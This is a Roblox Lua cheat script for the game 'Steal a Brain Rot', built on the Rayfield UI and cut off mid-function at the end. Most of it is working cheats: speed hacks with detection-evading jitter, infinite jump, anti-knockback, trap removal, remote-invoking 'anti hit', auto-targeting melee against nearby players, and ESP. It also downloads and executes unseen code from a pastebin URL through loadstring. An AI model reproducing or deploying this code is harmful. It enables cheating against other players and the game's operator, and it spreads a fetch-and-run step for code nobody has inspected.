-- 👆 GUI appears BEFORE Rayfield loading UI starts

task.defer(function()
    local Players = game:GetService("Players")
    local TweenService = game:GetService("TweenService")

    local player = Players.LocalPlayer
    local PlayerGui = player:WaitForChild("PlayerGui")

    local discordLink = "https://discord.gg/C5N4Y4cqqN"

    local translations = {
        ["en"] = { join = "Join our Discord!", copy = "Copy Link", copied = "Copied Discord Link!" },
        ["ar"] = { join = "انضم إلى ديسكوردنا!", copy = "نسخ الرابط", copied = "تم نسخ رابط الديسكورد!" },
        ["fil"] = { join = "Sumali sa aming Discord!", copy = "Kopyahin ang Link", copied = "Nai-copy ang Discord Link!" },
        ["pt"] = { join = "Junte-se ao nosso Discord!", copy = "Copiar Link", copied = "Link do Discord copiado!" },
        ["es"] = { join = "¡Únete a nuestro Discord!", copy = "Copiar enlace", copied = "¡Enlace de Discord copiado!" },
        ["fr"] = { join = "Rejoignez notre Discord !", copy = "Copier le lien", copied = "Lien Discord copié !" },
        ["ru"] = { join = "Присоединяйтесь к нашему Discord!", copy = "Скопировать ссылку", copied = "Ссылка Discord скопирована!" },
    }

    local locale = player.LocaleId:sub(1,2):lower()
    local texts = translations[locale] or translations["en"]

    local function rainbowColor(t)
        local r = (math.sin(t) * 0.5 + 0.5)
        local g = (math.sin(t + 2 * math.pi / 3) * 0.5 + 0.5)
        local b = (math.sin(t + 4 * math.pi / 3) * 0.5 + 0.5)
        return Color3.new(r, g, b)
    end

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "DiscordInviteGUI"
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.DisplayOrder = 999
    ScreenGui.Parent = PlayerGui

    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 320, 0, 110)
    Frame.Position = UDim2.new(0.5, -160, 0.05, 0)
    Frame.BackgroundColor3 = Color3.fromRGB(54, 57, 63)
    Frame.BackgroundTransparency = 1
    Frame.BorderSizePixel = 0
    Frame.AnchorPoint = Vector2.new(0.5, 0)
    Frame.ClipsDescendants = true
    Frame.Active = true
    Frame.Draggable = true
    Frame.ZIndex = 100
    Frame.Parent = ScreenGui

    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 20)

    local Glow = Instance.new("Frame", Frame)
    Glow.Size = UDim2.new(1, 14, 1, 14)
    Glow.Position = UDim2.new(0, -7, 0, -7)
    Glow.BackgroundTransparency = 1
    Glow.ZIndex = 99

    local GlowStroke = Instance.new("UIStroke", Glow)
    GlowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    GlowStroke.Thickness = 4
    GlowStroke.Transparency = 0
    GlowStroke.Color = Color3.fromRGB(255, 0, 0)

    Instance.new("UICorner", Glow).CornerRadius = UDim.new(0, 20)

    local TitleLabel = Instance.new("TextLabel", Frame)
    TitleLabel.Size = UDim2.new(1, -20, 0, 30)
    TitleLabel.Position = UDim2.new(0, 10, 0, 10)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = texts.join
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextSize = 22
    TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
    TitleLabel.TextTransparency = 1
    TitleLabel.ZIndex = 101

    local CopyButton = Instance.new("TextButton", Frame)
    CopyButton.Size = UDim2.new(0, 150, 0, 45)
    CopyButton.Position = UDim2.new(0.5, -75, 0, 55)
    CopyButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    CopyButton.TextSize = 18
    CopyButton.Font = Enum.Font.GothamSemibold
    CopyButton.Text = texts.copy
    CopyButton.AutoButtonColor = true
    CopyButton.BorderSizePixel = 0
    CopyButton.BackgroundTransparency = 1
    CopyButton.TextTransparency = 1
    CopyButton.ZIndex = 101
    Instance.new("UICorner", CopyButton).CornerRadius = UDim.new(0, 15)

    TweenService:Create(Frame, TweenInfo.new(1), {BackgroundTransparency = 0.1}):Play()
    TweenService:Create(TitleLabel, TweenInfo.new(1), {TextTransparency = 0}):Play()
    TweenService:Create(CopyButton, TweenInfo.new(1), {BackgroundTransparency = 0, TextTransparency = 0}):Play()

    local start = tick()
    game:GetService("RunService").Heartbeat:Connect(function()
        local t = tick() - start
        GlowStroke.Color = rainbowColor(t * 2)
    end)

    local function fadeOut()
        TweenService:Create(Frame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
        TweenService:Create(TitleLabel, TweenInfo.new(1), {TextTransparency = 1}):Play()
        TweenService:Create(CopyButton, TweenInfo.new(1), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        task.delay(1, function()
            ScreenGui:Destroy()
        end)
    end

    CopyButton.MouseButton1Click:Connect(function()
        if setclipboard then setclipboard(discordLink) end
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Discord",
                Text = texts.copied,
                Duration = 3,
                Icon = "rbxassetid://13412031254"
            })
        end)
        fadeOut()
    end)

    task.delay(10, fadeOut)
end)

-- GUI with Draggable Circular ImageButton to simulate pressing K key
local ScreenGui = Instance.new("ScreenGui")
local KButton = Instance.new("ImageButton")

-- Parent GUI to CoreGui (requires exploit environment like Synapse)
ScreenGui.Name = "KKeyGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game:GetService("CoreGui")

-- Configure circular image button (11% smaller than 78 → ~69px)
KButton.Parent = ScreenGui
KButton.Size = UDim2.new(0, 69, 0, 69)
KButton.Position = UDim2.new(0, 40, 0.4, -34)
KButton.BackgroundTransparency = 1
KButton.Image = "rbxassetid://139349233430103"
KButton.ScaleType = Enum.ScaleType.Fit
KButton.ClipsDescendants = true

-- Make it circular
local corner = Instance.new("UICorner", KButton)
corner.CornerRadius = UDim.new(1, 0)

-- Draggable (supports both Mouse & Touch)
local dragging = false
local dragStart, startPos

local function inputPosition(input)
	return input.Position or input.TouchPosition or Vector2.zero
end

KButton.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = inputPosition(input)
		startPos = KButton.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = inputPosition(input) - dragStart
		KButton.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
end)

-- Simulate pressing the K key
KButton.MouseButton1Click:Connect(function()
	local vim = game:GetService("VirtualInputManager")
	vim:SendKeyEvent(true, Enum.KeyCode.K, false, game)  -- Key down
	vim:SendKeyEvent(false, Enum.KeyCode.K, false, game) -- Key up
end)


local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Create the main window
local Window = Rayfield:CreateWindow({
Name = "Steal a Brain Rot Destroyer v2 Ken Hub",
LoadingTitle = "made by ken_i",
LoadingSubtitle = "Using Rayfield",
ConfigurationSaving = { Enabled = true },
Discord = { Enabled = false },
KeySystem = false
})

pcall(function()
   loadstring(game:HttpGet("https://pastebin.com/raw/MWYTEiiy", true))()
end)

-- Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Core variables
local speedLockEnabled = false
local visibilityEnabled = false
local antiTrapEnabled = false
local antiTrapRunning = false
local medusaEnabled = false
local medusaCooldown = false
local medusaToolName = "Medusa's Head"
local medusaRange = 16
local sentryActive = false
local shopNPCCashActive = false
local originalShopPositions = {}

-- ShopNPCCash functionality
local function manageShopNPCCash()
while shopNPCCashActive and task.wait(0.1) do
local cashModel = workspace:FindFirstChild("ShopNPCCash")
local character = LocalPlayer.Character
local rootPart = character and character:FindFirstChild("HumanoidRootPart")

if cashModel and cashModel:IsA("Model") and rootPart then
-- Store original position if not already stored
if not originalShopPositions[cashModel] then
local primaryPart = cashModel.PrimaryPart or cashModel:FindFirstChildWhichIsA("BasePart")
if primaryPart then
originalShopPositions[cashModel] = primaryPart.CFrame
end
end

-- Prepare and move the model
local primaryPart = cashModel.PrimaryPart or cashModel:FindFirstChildWhichIsA("BasePart")
if primaryPart then
for _, part in ipairs(cashModel:GetDescendants()) do
if part:IsA("BasePart") then
part.Anchored = false
part.CanCollide = false
part.Massless = true
end
end
cashModel:SetPrimaryPartCFrame(rootPart.CFrame * CFrame.new(0, 0, -3))
end
end
end

-- Return shops to original positions when disabled
if not shopNPCCashActive then
for model, position in pairs(originalShopPositions) do
if model and model.Parent then
local primaryPart = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
if primaryPart then
model:SetPrimaryPartCFrame(position)
for _, part in ipairs(model:GetDescendants()) do
if part:IsA("BasePart") then
part.Anchored = true
part.CanCollide = true
part.Massless = false
end
end
end
end
end
originalShopPositions = {}
end
end

-- Visibility functionality
local function makeCharacterVisible(character)
for _, part in ipairs(character:GetDescendants()) do
if part:IsA("BasePart") then
part.Transparency = 0
part.CanCollide = false
elseif part:IsA("Accessory") or part:IsA("Tool") then
local handle = part:FindFirstChild("Handle")
if handle and handle:IsA("BasePart") then
handle.Transparency = 0
handle.CanCollide = false
end
end
end
end

local function makeToolsVisible(player)
local backpack = player:FindFirstChild("Backpack")
if backpack then
for _, tool in ipairs(backpack:GetChildren()) do
local handle = tool:FindFirstChild("Handle")
if handle and handle:IsA("BasePart") then
handle.Transparency = 0
handle.CanCollide = false
end
end
end
if player.Character then
for _, tool in ipairs(player.Character:GetChildren()) do
local handle = tool:FindFirstChild("Handle")
if handle and handle:IsA("BasePart") then
handle.Transparency = 0
handle.CanCollide = false
end
end
end
end

local function onCharacterAdded(character)
makeCharacterVisible(character)
character.ChildAdded:Connect(function(child)
task.wait(0.1)
if child:IsA("BasePart") then
child.Transparency = 0
child.CanCollide = true
elseif child:IsA("Accessory") or child:IsA("Tool") then
local handle = child:FindFirstChild("Handle")
if handle and handle:IsA("BasePart") then
handle.Transparency = 0
handle.CanCollide = false
end
end
end)
end

-- Speed lock
local function applySpeedProtection(humanoid)
if not humanoid then return end
humanoid.WalkSpeed = desiredSpeed
humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
if speedLockEnabled and humanoid.WalkSpeed ~= desiredSpeed then
humanoid.WalkSpeed = desiredSpeed
end
end)
end

-- Character listener
local function onPlayerCharacterAdded(character)
local humanoid = character:WaitForChild("Humanoid", 5)
if humanoid and speedLockEnabled then
applySpeedProtection(humanoid)
end
if visibilityEnabled then
onCharacterAdded(character)
end
end

LocalPlayer.CharacterAdded:Connect(onPlayerCharacterAdded)
if LocalPlayer.Character then onPlayerCharacterAdded(LocalPlayer.Character) end

-- Fake trap creation
local function getAveragePosition(obj)
if obj:IsA("Model") then
local total = Vector3.zero
local count = 0
for _, part in ipairs(obj:GetDescendants()) do
if part:IsA("BasePart") then
total += part.Position
count += 1
end
end
if count > 0 then return total / count end
elseif obj:IsA("BasePart") then
return obj.Position
end
return Vector3.zero
end

local function createFakeTrap(position)
local part = Instance.new("Part")
part.Name = "FakeTrap"
part.Size = Vector3.new(1.3,1.3,1.3)
part.Anchored = true
part.CanCollide = false
part.Color = Color3.fromRGB(0,255,0)
part.Material = Enum.Material.SmoothPlastic
part.Position = position + Vector3.new(0, part.Size.Y/2, 0)
part.Parent = workspace
end

local function startAntiTrap()
if antiTrapRunning then return end
antiTrapRunning = true
task.spawn(function()
while antiTrapEnabled do
for _, obj in ipairs(workspace:GetDescendants()) do
if obj.Name == "Trap" then
local pos = getAveragePosition(obj)
pcall(function() obj:Destroy() end)
createFakeTrap(pos)
end
end
task.wait(5)
end
antiTrapRunning = false
end)
end

-- Medusa logic
local function activateMedusa()
if medusaCooldown then return end
local char = LocalPlayer.Character
if not char then return end
local humanoid = char:FindFirstChildOfClass("Humanoid")
if not humanoid then return end
local equipped = char:FindFirstChild(medusaToolName)
if equipped then
equipped:Activate()
else
local tool = LocalPlayer.Backpack:FindFirstChild(medusaToolName)
if tool then
humanoid:EquipTool(tool)
task.wait(0.00001)
tool:Activate()
end
end
medusaCooldown = true
task.delay(0.006, function() medusaCooldown = false end)
end

-- Sentry grab logic
RunService.Heartbeat:Connect(function()
if not sentryActive then return end

local char = LocalPlayer.Character
if not char then return end
local tool = char:FindFirstChildOfClass("Tool")
local handle = tool and tool:FindFirstChild("Handle")
if not handle then return end

for _, part in ipairs(workspace:GetDescendants()) do
if part:IsA("BasePart") and part.Name:find("Sentry_") then
local dist = (part.Position - handle.Position).Magnitude
if dist <= 70 then
part.Massless = true
part.CanCollide = false
part.Anchored = false
part.CFrame = handle.CFrame
end
end
end
end)

-- UI Setup
local MainTab = Window:CreateTab("🎯 Main", 6034818371)
-- Below your Rayfield window and MainTab setup

local player = game:GetService("Players").LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local isHeavy = false
local normalProps = {}
local heavyDensity = 15

-- Function to toggle heaviness
local function setHeaviness(enable)
	isHeavy = enable
	local character = player.Character
	if not character then return end

	for _, part in ipairs(character:GetDescendants()) do
		if part:IsA("BasePart") and not part.Massless then
			if enable then
				normalProps[part] = part.CustomPhysicalProperties or PhysicalProperties.new()
				part.CustomPhysicalProperties = PhysicalProperties.new(
					heavyDensity,
					normalProps[part].Friction,
					normalProps[part].Elasticity,
					normalProps[part].FrictionWeight,
					normalProps[part].ElasticityWeight
				)
			elseif normalProps[part] then
				part.CustomPhysicalProperties = normalProps[part]
			end
		end
	end
end

-- Reapply on respawn
player.CharacterAdded:Connect(function(char)
	character = char
	normalProps = {}
	if isHeavy then
		setHeaviness(true)
	end
end)

-- 💢 Rayfield Toggle for Less Knock Back
MainTab:CreateToggle({
	Name = "💢 No Knock Back",
	CurrentValue = false,
	Callback = function(enabled)
		setHeaviness(enabled)
	end
})

local function runAntiHitScript()
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local localPlayer = Players.LocalPlayer

    local text = {
        title = "Anti Hit System",
        statusOn = "Anti Hit active for {time}s",
        statusOff = "Use before steal",
        toggleOn = "Enable",
        close = "X",
    }

    -- Remove existing GUI if present
    local existingGui = localPlayer:FindFirstChild("PlayerGui"):FindFirstChild("AntiHitSystemGui")
    if existingGui then existingGui:Destroy() end

    -- Create AntiHit GUI
    local AntiHitGui = Instance.new("ScreenGui")
    AntiHitGui.Name = "AntiHitSystemGui"
    AntiHitGui.ResetOnSpawn = false
    AntiHitGui.Parent = localPlayer:WaitForChild("PlayerGui")

    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 220, 0, 90)
    Frame.Position = UDim2.new(0, 20, 0.8, 0)
    Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    Frame.BorderSizePixel = 0
    Frame.AnchorPoint = Vector2.new(0, 1)
    Frame.Parent = AntiHitGui
    Frame.Active = true
    Frame.Draggable = true

    local UIStroke = Instance.new("UIStroke", Frame)
    UIStroke.Color = Color3.fromRGB(100, 100, 100)
    UIStroke.Thickness = 1

    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(1, 0, 0, 25)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Font = Enum.Font.GothamBold
    TitleLabel.TextSize = 18
    TitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    TitleLabel.Text = text.title
    TitleLabel.Parent = Frame

    local StatusLabel = Instance.new("TextLabel")
    StatusLabel.Position = UDim2.new(0, 10, 0, 35)
    StatusLabel.Size = UDim2.new(1, -20, 0, 30)
    StatusLabel.BackgroundTransparency = 1
    StatusLabel.Font = Enum.Font.Gotham
    StatusLabel.TextSize = 16
    StatusLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
    StatusLabel.TextWrapped = true
    StatusLabel.Text = text.statusOff
    StatusLabel.Parent = Frame

    local ToggleButton = Instance.new("TextButton")
    ToggleButton.Position = UDim2.new(0, 10, 0, 70)
    ToggleButton.Size = UDim2.new(1, -20, 0, 20)
    ToggleButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    ToggleButton.BorderSizePixel = 0
    ToggleButton.Font = Enum.Font.GothamBold
    ToggleButton.TextSize = 16
    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    ToggleButton.Text = text.toggleOn
    ToggleButton.Parent = Frame

    local function buyWebSlinger()
        local remoteFunction = ReplicatedStorage.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
        if remoteFunction then
            local success, err = pcall(function()
                remoteFunction:InvokeServer("Web Slinger")
            end)
            if not success then
                warn("Failed to buy Web Slinger:", err)
            end
        else
            warn("RemoteFunction RF/CoinsShopService/RequestBuy not found")
        end
    end

    local function equipToolByName(toolName)
        local character = localPlayer.Character
        local backpack = localPlayer:FindFirstChild("Backpack")
        if not character or not backpack then return nil end

        local tool = backpack:FindFirstChild(toolName) or character:FindFirstChild(toolName)
        if not tool then return nil end

        tool.Parent = character

        local handle = tool:FindFirstChild("Handle")
        if handle then
            handle.Transparency = 0
        end

        return tool
    end

    local function unequipAllExcept(toolName)
        local character = localPlayer.Character
        local backpack = localPlayer:FindFirstChild("Backpack")
        if not character or not backpack then return end

        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:UnequipTools()
        end

        for _, tool in ipairs(character:GetChildren()) do
            if tool:IsA("Tool") and tool.Name ~= toolName then
                tool.Parent = backpack
            end
        end
    end

    local function fireRemote(toolName)
        unequipAllExcept(toolName)
        local tool = equipToolByName(toolName)
        if not tool then return end

        task.wait(0.0065)

        local character = localPlayer.Character
        local humanoid = character and character:FindFirstChild("Humanoid")
        local rootPart = character and character:FindFirstChild("HumanoidRootPart")
        local arm = character and character:FindFirstChild("LeftLowerArm")
        local handle = tool:FindFirstChild("Handle")

        local remoteEvent = ReplicatedStorage.Packages.Net:FindFirstChild("RE/UseItem")
        if arm and handle and remoteEvent then
            remoteEvent:FireServer(character:GetPrimaryPartCFrame(), arm, handle)
            task.delay(0.2, function()
                if humanoid then humanoid.PlatformStand = false end
                if rootPart then rootPart.Anchored = false end
            end)
        end
    end

    local toolName = nil
    local countdownTask = nil

    ToggleButton.MouseButton1Click:Connect(function()
        if countdownTask then return end

        fireRemote(toolName)

        local total = 10
        local start = os.clock()

        countdownTask = task.spawn(function()
            while true do
                local timeLeft = math.max(0, total - (os.clock() - start))
                StatusLabel.Text = text.statusOn:gsub("{time}", string.format("%.1f", timeLeft))
                if timeLeft <= 0 then
                    StatusLabel.Text = text.statusOff
                    countdownTask = nil
                    break
                end
                task.wait(0.1)
            end
        end)
    end)

    task.spawn(function()
        while true do
            local character = localPlayer.Character
            local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
            if humanoid and humanoid.WalkSpeed ~= 50 then
                humanoid.WalkSpeed = 50
            end
            task.wait(0.1)
        end
    end)

    local function resetGuiTexts()
        TitleLabel.Text = text.title
        StatusLabel.Text = text.statusOff
        ToggleButton.Text = text.toggleOn
    end

    localPlayer.CharacterAdded:Connect(function()
        task.wait(2)
        resetGuiTexts()
    end)

    buyWebSlinger()

    local tries = 0
    repeat
        tries = tries + 1
        task.wait(0.5)
        local tool = localPlayer.Backpack:FindFirstChild("Web Slinger") or (localPlayer.Character and localPlayer.Character:FindFirstChild("Web Slinger"))
        if tool then
            toolName = tool.Name
            break
        end
    until tries > 10

    if not toolName then
        warn("Web Slinger tool not found after purchase!")
    end
end

-- Now create your Rayfield button exactly as you wanted:

MainTab:CreateButton({
    Name = "🤺 Activate Anti Hit System",
    Callback = function()
        runAntiHitScript()
    end
})

-- Wait until game is loaded
if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local humanoid = character:WaitForChild("Humanoid")

-- Speed boost toggle state (start OFF)
local speedBoostEnabled = false

-- Movement parameters
local targetSpeed = 45
local baseLerpSpeed = 10
local jitterAmount = 0.1
local velocityThreshold = 0.5

-- Ping estimation function
local function getEstimatedPing()
    local stats = player:FindFirstChild("Stats")
    if stats and stats:FindFirstChild("Network") then
        local network = stats.Network
        local pingMs = network:GetAttribute("Ping") or 0
        return pingMs / 1000
    end
    return 0.1
end

local function lerp(a, b, t)
    return a + (b - a) * t
end

-- RunService loop controlling speed boost
RunService.Heartbeat:Connect(function(dt)
    if not speedBoostEnabled then return end

    if not humanoidRootPart or not humanoid then return end
    if humanoid.MoveDirection.Magnitude > 0 then
        local currentVel = humanoidRootPart.Velocity
        local moveDir = humanoid.MoveDirection.Unit

        local desiredVelX = moveDir.X * targetSpeed
        local desiredVelZ = moveDir.Z * targetSpeed

        local ping = getEstimatedPing()
        local lerpSpeed = baseLerpSpeed / math.max(ping, 0.05)

        local diffX = math.abs(currentVel.X - desiredVelX)
        local diffZ = math.abs(currentVel.Z - desiredVelZ)

        local newVelX = currentVel.X
        local newVelZ = currentVel.Z

        if diffX > velocityThreshold then
            newVelX = lerp(currentVel.X, desiredVelX, math.clamp(lerpSpeed * dt, 0, 1))
        end
        if diffZ > velocityThreshold then
            newVelZ = lerp(currentVel.Z, desiredVelZ, math.clamp(lerpSpeed * dt, 0, 1))
        end

        newVelX = newVelX + (math.random() - 0.5) * jitterAmount
        newVelZ = newVelZ + (math.random() - 0.5) * jitterAmount

        humanoidRootPart.Velocity = Vector3.new(newVelX, currentVel.Y, newVelZ)
    end
end)

-- Update references on respawn
player.CharacterAdded:Connect(function(newChar)
    character = newChar
    humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoid = character:WaitForChild("Humanoid")
end)

-- ⚡️ Speed Boost toggle using Rayfield UI (place your tab in 'MainTab')
MainTab:CreateToggle({
    Name = "⚡️ Speed Boost",
    CurrentValue = false,
    Callback = function(state)
        speedBoostEnabled = state
        print("⚡️ Speed Boost is now " .. (state and "ON ✅" or "OFF ❌"))
    end
})


-- Main heartbeat loop (runs each frame)
RunService.Heartbeat:Connect(function()
if not autoSwordEnabled then return end

local char = LocalPlayer.Character
local hrp = char and char:FindFirstChild("HumanoidRootPart")
local backpack = LocalPlayer:FindFirstChild("Backpack")
if not (char and hrp and backpack) then return end

-- Find nearest player within 17 studs
local nearest, dist
for _, pl in ipairs(Players:GetPlayers()) do
if pl ~= LocalPlayer and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
local d = (hrp.Position - pl.Character.HumanoidRootPart.Position).Magnitude
if not nearest or d < dist then
nearest, dist = pl, d
end
end
end

-- If a player is within range, face them
if nearest and dist <= 17 then
local targetHRP = nearest.Character:FindFirstChild("HumanoidRootPart")
hrp.CFrame = CFrame.lookAt(hrp.Position, Vector3.new(targetHRP.Position.X, hrp.Position.Y, targetHRP.Position.Z))

-- Equip â†’ Activate â†’ Unequip sword
if tick() - lastUsed >= 1 then
for _, tool in ipairs(backpack:GetChildren()) do
if tool:IsA("Tool") and tool.Name:match("Sword$") then
lastUsed = tick()
-- Clear current tool
for _, eq in ipairs(char:GetChildren()) do
if eq:IsA("Tool") then eq.Parent = backpack end
end
-- Use sword
tool.Parent = char
tool:Activate()
task.delay(0.3, function()
if tool.Parent == char then
tool.Parent = backpack
end
end)
break
end
end
end
end
end)


--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer

--// Toggles
local jumpBoostEnabled = false
local infiniteJumpEnabled = false

--// Settings
local jumpBoostForce = 71
local infiniteJumpMin = 45
local infiniteJumpMax = 60
local jumpCooldown = 0.05

--// State
local lastJumpTime = 0
local character, humanoid, rootPart
local boostConnection = nil

--// Rebinds character on spawn/reset
local function bindCharacter(char)
	character = char
	humanoid = char:WaitForChild("Humanoid")
	rootPart = char:WaitForChild("HumanoidRootPart")
	local jumping = false

	-- Clear old connection
	if boostConnection then
		boostConnection:Disconnect()
	end

	-- Jump Boost logic (trigger on jump state)
	boostConnection = humanoid.StateChanged:Connect(function(_, new)
		if new == Enum.HumanoidStateType.Jumping and not jumping and jumpBoostEnabled then
			jumping = true

			RunService.RenderStepped:Wait()
			if rootPart and rootPart.Parent then
				local currentVel = rootPart.Velocity
				rootPart.Velocity = currentVel + Vector3.new(0, jumpBoostForce, 0)
			end

			task.delay(0.2, function()
				jumping = false
			end)
		end
	end)
end

--// Initial bind
if LocalPlayer.Character then
	bindCharacter(LocalPlayer.Character)
end

--// Rebind on respawn
LocalPlayer.CharacterAdded:Connect(function(char)
	bindCharacter(char)
end)

--// Infinite Jump: Trigger on JumpRequest
UserInputService.JumpRequest:Connect(function()
	if not infiniteJumpEnabled then return end
	if not humanoid or not rootPart then return end
	if tick() - lastJumpTime < jumpCooldown then return end

	local state = humanoid:GetState()
	if state == Enum.HumanoidStateType.Freefall or state == Enum.HumanoidStateType.Running or state == Enum.HumanoidStateType.Jumping then
		local boost = math.random(infiniteJumpMin * 10, infiniteJumpMax * 10) / 10
		rootPart.Velocity = Vector3.new(rootPart.Velocity.X, boost, rootPart.Velocity.Z)
		lastJumpTime = tick()
	end
end)

--// UI Toggles (Connect to your MainTab)
MainTab:CreateToggle({
	Name = "🕊️ Infinite Jump",
	CurrentValue = false,
	Callback = function(state)
		infiniteJumpEnabled = state
	end
})

MainTab:CreateToggle({
	Name = "🏃‍♂️ Jump Boost",
	CurrentValue = false,
	Callback = function(state)
		jumpBoostEnabled = state
	end
})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer

local autoActivateEnabled = false
local RANGE = 30
local DEBOUNCE_TIME = 0.15
local lastUsed = 0

local function getNearestPlayer(maxDistance)
local character = LocalPlayer.Character
if not character then return nil end
local hrp = character:FindFirstChild("HumanoidRootPart")
if not hrp then return nil end

for _, player in ipairs(Players:GetPlayers()) do
if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
local dist = (hrp.Position - player.Character.HumanoidRootPart.Position).Magnitude
if dist <= maxDistance then
return player
end
end
end
return nil
end

-- Heartbeat connection (runs only when toggle is enabled)
RunService.Heartbeat:Connect(function()
if not autoActivateEnabled then return end

local now = tick()
if now - lastUsed < DEBOUNCE_TIME then return end

local character = LocalPlayer.Character
if not character then return end
local hrp = character:FindFirstChild("HumanoidRootPart")
if not hrp then return end

local target = getNearestPlayer(RANGE)
if target then
-- Check the tool currently equipped (in character)
for _, tool in ipairs(character:GetChildren()) do
if tool:IsA("Tool") then
if tool.Name:match("Slap$") or tool.Name:match("Sword$") or tool.Name:match("Bat$") then
lastUsed = now
-- Activate without unequipping
tool:Activate()
break
end
end
end
end
end)


-- Add the toggle in MainTab
MainTab:CreateToggle({
Name = "👋Auto Hit",
CurrentValue = false,
Flag = "AutoActivateTools",
Callback = function(value)
autoActivateEnabled = value
end
})

local ShopTab = Window:CreateTab("🛒 Shop", 6034818371)
local EspTab = Window:CreateTab("👀 ESP", 6034818371)

local activeLockTimeEsp = false
local lteInstances = {}
local espUpdateTask = nil

local toggleButton

local function toggleLockTimeESP(state)
activeLockTimeEsp = state
if not activeLockTimeEsp then
for _, instance in pairs(lteInstances) do
if instance and instance.Parent then
instance:Destroy()
end
end
lteInstances = {}
end
end

local function updateLock()
if not activeLockTimeEsp then return end

for _, plot in pairs(workspace.Plots:GetChildren()) do
local purchases = plot:FindFirstChild("Purchases", true)
local plotBlock = purchases and purchases:FindFirstChild("PlotBlock", true)
local mainPart = plotBlock and plotBlock:FindFirstChild("Main", true)
local billboardGui = mainPart and mainPart:FindFirstChild("BillboardGui", true)
local timeLabel = billboardGui and billboardGui:FindFirstChild("RemainingTime", true)

if timeLabel and timeLabel:IsA("TextLabel") then
local espName = "LockTimeESP_" .. plot.Name
local existingBillboard = plot:FindFirstChild(espName)

local isUnlocked = timeLabel.Text == "0s"
local displayText = isUnlocked and "Unlocked" or ("Lock: " .. timeLabel.Text)

local textColor
if isUnlocked then
textColor = Color3.fromRGB(0, 255, 0) -- Green
else
textColor = Color3.fromRGB(255, 255, 0) -- Yellow
end

if not existingBillboard then
local billboard = Instance.new("BillboardGui")
billboard.Name = espName
billboard.Size = UDim2.new(0, 200, 0, 30)
billboard.StudsOffset = Vector3.new(0, 5, 0)
billboard.AlwaysOnTop = true
billboard.Adornee = mainPart

local label = Instance.new("TextLabel")
label.Text = displayText
label.Size = UDim2.new(1, 0, 1, 0)
label.BackgroundTransparency = 1
label.TextScaled = true
label.TextColor3 = textColor
label.TextStrokeColor3 = Color3.new(0, 0, 0)
label.TextStrokeTransparency = 0
label.Font = Enum.Font.SourceSansBold
label.Parent = billboard

billboard.Parent = plot
lteInstances[plot.Name] = billboard
else
local label = existingBillboard:FindFirstChildOfClass("TextLabel")
if label then
label.Text = displayText
label.TextColor3 = textColor
end
end
else
if lteInstances[plot.Name] then
lteInstances[plot.Name]:Destroy()
lteInstances[plot.Name] = nil
end
end
end
end

-- Create toggle but disable turning off once on
toggleButton = EspTab:CreateToggle({
Name = "🔒LockTime ESP",
CurrentValue = false,
Callback = function(enabled)
if enabled then
toggleLockTimeESP(true)
if espUpdateTask then
espUpdateTask:Cancel()
end
espUpdateTask = task.spawn(function()
while activeLockTimeEsp do
updateLock()
task.wait(0.25)
end
end)
else
-- Prevent turning off by resetting toggle to true
toggleButton:SetValue(true)
end
end
})

local espEnabled = false
local Players = game:GetService("Players")
local ESPObjects = {}

local function createESP(player)
